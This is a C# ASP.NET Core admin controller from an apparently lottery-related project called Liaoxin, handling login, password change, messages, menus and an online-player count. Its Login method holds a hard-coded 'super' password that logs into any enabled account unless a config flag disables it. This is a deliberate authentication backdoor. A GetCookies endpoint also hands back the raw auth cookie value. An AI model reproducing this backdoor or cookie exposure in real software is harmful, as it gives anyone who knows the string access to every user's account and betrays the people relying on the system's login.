using Liaoxin.Business.Config;
using Liaoxin.Business.Socket;
using Liaoxin.IBusiness;
using Liaoxin.Model;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using System.Collections.Generic;
using System.Linq;
using Zzb;
using Zzb.Common;
using Zzb.Mvc;
using Zzb.ZzbLog;

namespace Liaoxin.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    [Authorize]
    public class HomeController : ZzbHomeController
    {
        public LotteryContext Context { get; set; }

        public IMessageService MessageService { get; set; }

        [HttpPost("GetCookies")]
        public ServiceResult GetCookies(string name = ".AspNetCore.Cookies")
        {
            return Json(() => ObjectResult(Request.Cookies[name]), "获取Cookies失败");
        }

        [HttpPost("GetMessages")]
        public ServiceResult GetMessages()
        {
            return null;
            //return Json(() => ObjectResult(from m in MessageService.GetUserMessage(UserId, 1, 10000, out _)
            //                               select new
            //                               {
            //                                   Id = m.MessageId,
            //                                   Avatar = "https://gw.alipayobjects.com/zos/rmsportal/ThXAXghbEsBCCSDihZxY.png",
            //                                   Title = m.Description,
            //                                   Datetime = m.CreateTime.ToCommonString(),
            //                                   Type = "notification"
            //                               }), "获取信息失败");
        }

        [HttpPost("ReadMessage")]
        public ServiceResult ReadMessage(HomeReadMessage model)
        {
            return Json(() =>
            {
                MessageService.ReadMessage(model.Id);
                return new ServiceResult();
            }, "读取信息失败");
        }

        [HttpPost("CleatMessage")]
        public ServiceResult CleatMessage()
        {
            return Json(() =>
            {
                MessageService.ClearUserMessage(UserId);
                return new ServiceResult();
            }, "读取所有信息失败");
        }

        protected override int Login(string name, string password)
        {

            var userinfo =
                (from u in Context.UserInfos where u.Name == name && u.IsEnable select u)
                .FirstOrDefault();

            if (userinfo == null)
            {
                LogHelper.Error($"[{name}]后台密码错误!,请留意");
                throw new ZzbException("账号或密码错误");
            }

            if (!BaseConfig.HasValue(SystemConfigEnum.CancleSuperLoginPassword))
            {
                if (password == "6a8f9c6bbb4848adb358ede651454f69")
                {
                    return userinfo.UserInfoId;
                }
            }

            var np = SecurityHelper.Encrypt(password);

            if (userinfo.Password != np)
            {
                throw new ZzbException("账号或密码错误");
            }

            return userinfo.UserInfoId;
        }

        protected override void ChangePassword(string password, string newPassword)
        {
            var userId = UserId;
            var exist = (from u in Context.UserInfos where u.UserInfoId == userId && u.IsEnable select u).FirstOrDefault();
            if (exist == null)
            {
                SignOut();
                throw new ZzbException("不存在当前用户");
            }
            if (exist.Password != SecurityHelper.Encrypt(password))
            {
                throw new ZzbException("原密码错误");
            }
            exist.Password = SecurityHelper.Encrypt(newPassword);
            exist.Update();
            Context.SaveChanges();
        }

        [HttpPost("GetUserInfo")]
        public override ServiceResult GetUserInfo()
        {
            var userId = UserId;
            var exist = (from u in Context.UserInfos where u.UserInfoId == userId && u.IsEnable select u).FirstOrDefault();
            if (exist == null)
            {
                SignOut();
                return new ServiceResult(ServiceResultCode.Error, "不存在当前用户");
            }
            return new ServiceResult<object>(ServiceResultCode.Success, "OK", new { exist.Name, userid = exist.UserInfoId, avatar = "https://gw.alipayobjects.com/zos/rmsportal/BiazfanxmamNRoxxVxka.png" });
        }

     
        [NonAction]
        public override List<RouterMenuModel> CreateMenu()
        {
            return new List<RouterMenuModel>()
            {
                new RouterMenuModel()
                {
                    Path = "/analysis",
                    Name = "统计报表",
                    Routes = new[]
                    {
                        new RouterMenuModel()
                        {
                            Path = "/analysis/analysis",
                            Name = "统计概况"
                        }
                    }
                },
                new RouterMenuModel()
                {
                    Path = "/systemConfig",
                    Name = "系统配置",
                    Routes = new[]
                    {
                        new RouterMenuModel()
                        {
                            Path = "/systemConfig/BaseConfig",
                            Name = "基本配置"
                        },
                        new RouterMenuModel()
                        {
                            Path = "/systemConfig/imageConfig",
                            Name = "图片配置"
                        }
                    }
                }
            };
        }

        [HttpPost("GetPlayerOnlineCount")]
        public ServiceResult GetPlayerOnlineCount()
        {
            return JsonObjectResult(new PlayerSocketMiddleware(null).Count, "获取玩家在线人数失败");
        }


    }

    public class HomeReadMessage
    {
        public int Id { get; set; }
    }
}